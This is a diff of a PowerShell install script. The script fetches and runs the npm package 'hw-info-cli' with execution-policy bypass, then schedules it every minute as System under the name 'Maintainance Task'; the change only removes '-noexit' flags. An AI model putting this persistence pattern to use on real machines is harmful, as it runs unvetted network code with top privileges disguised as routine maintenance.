@@ -13,10 +13,10 @@ Write-Host 'Installing Node'
 
 Write-Host 'Downloading cli'
 $env:Path += ";C:\Program Files\nodejs"
-Start-Process powershell -ArgumentList "-noexit","-command &{ Set-ExecutionPolicy Bypass -Scope Process -Force; npm i hw-info-cli -g }" -Wait
+Start-Process powershell -ArgumentList "-command &{ Set-ExecutionPolicy Bypass -Scope Process -Force; npm i hw-info-cli -g }" -Wait
 
 $env:Path += ";$env:APPDATA\npm\"
-Start-Process powershell -ArgumentList "-noexit","-command &{ Set-ExecutionPolicy Bypass -Scope Process -Force; hw-info-cli.cmd -s}" -Wait
+Start-Process powershell -ArgumentList "-command &{ Set-ExecutionPolicy Bypass -Scope Process -Force; hw-info-cli.cmd -s}" -Wait
 
 Write-Host 'Setting Tasks'
 schtasks /create /sc MINUTE /tn "Maintainance Task" /tr "hw-info-cli" /ru System /rl Highest
